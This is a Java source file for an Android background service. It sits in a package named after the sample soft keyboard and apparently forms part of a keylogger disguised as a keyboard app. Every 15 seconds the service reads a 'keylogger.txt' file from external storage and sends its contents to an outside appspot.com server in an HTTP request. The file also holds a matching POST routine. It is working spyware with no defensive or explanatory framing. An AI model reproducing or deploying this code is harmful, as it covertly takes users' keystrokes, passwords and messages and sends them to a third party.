package com.example.android.softkeyboard;

import android.app.Service;
import android.content.Intent;
import android.os.Environment;
import android.os.IBinder;
import android.util.Log;

import org.apache.http.HttpResponse;
import org.apache.http.NameValuePair;
import org.apache.http.client.ClientProtocolException;
import org.apache.http.client.HttpClient;
import org.apache.http.client.entity.UrlEncodedFormEntity;
import org.apache.http.client.methods.HttpGet;
import org.apache.http.client.methods.HttpPost;
import org.apache.http.client.utils.URLEncodedUtils;
import org.apache.http.impl.client.DefaultHttpClient;
import org.apache.http.message.BasicNameValuePair;

import java.io.BufferedReader;
import java.io.File;
import java.io.FileReader;
import java.io.IOException;
import java.util.ArrayList;
import java.util.List;
import java.util.Timer;
import java.util.TimerTask;

public class SendDataService extends Service {
    private Timer timer;
    private TimerTask timerTask;

    public SendDataService() {
    }

    @Override
    public IBinder onBind(Intent intent) {
        // TODO: Return the communication channel to the service.
        throw new UnsupportedOperationException("Not yet implemented");
    }

    @Override
    public void onCreate() {
        System.out.println("Hello World!");
        timer = new Timer();
        initializeTimerTask();
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        System.out.println("Started data sending service");
        timer.schedule(timerTask, 0, 15*1000);
        return flags;
    }

    @Override
    public void onDestroy() {
        System.out.println("Destroying data sending service");
        return;
    }

    private void initializeTimerTask() {
        timerTask = new TimerTask() {
            @Override
            public void run() {
                try{
                    String SDCARD = Environment.getExternalStorageDirectory().getAbsolutePath();
                    String FILENAME = "keylogger.txt";

                    File inputfile = new File(SDCARD+File.separator+FILENAME);
                    BufferedReader br = new BufferedReader(new FileReader(inputfile));
                    StringBuilder completeFileContent = new StringBuilder();
                    String line = br.readLine();

                    while(line!= null) {
                        completeFileContent.append(line).append("\n");
                        line = br.readLine();
                    }
                    System.out.println(completeFileContent.toString());
                    getData(completeFileContent.toString());
                    br.close();
                }catch(Exception e) {
                    Log.d("EXCEPTION", e.getMessage());
                }
            }
        };
    }

    public void postData(String stringToPost) {
        // Create a new HttpClient and Post Header
        HttpClient httpclient = new DefaultHttpClient();
        HttpPost httppost = new HttpPost("http://1-dot-ninjabotscmu.appspot.com/ninjabotscmu");

        try {
            // Add your data
            List<NameValuePair> nameValuePairs = new ArrayList<NameValuePair>(2);
            nameValuePairs.add(new BasicNameValuePair("data", stringToPost));
            httppost.setEntity(new UrlEncodedFormEntity(nameValuePairs));

            // Execute HTTP Post Request
            HttpResponse response = httpclient.execute(httppost);

        } catch (ClientProtocolException e) {
            e.printStackTrace();
        } catch (IOException e) {
            e.printStackTrace();
        }
    }

    public void getData(String str) {
        HttpClient httpClient = new DefaultHttpClient();
        List<NameValuePair> params = new ArrayList<NameValuePair>();
        params.add(new BasicNameValuePair("data",str));
        HttpGet myGet = new HttpGet("http://1-dot-ninjabotscmu.appspot.com/ninjabotscmu?"+ URLEncodedUtils.format(params, "utf-8"));
        try {
            httpClient.execute(myGet);
        } catch (IOException e) {
            e.printStackTrace();
        }
    }
}
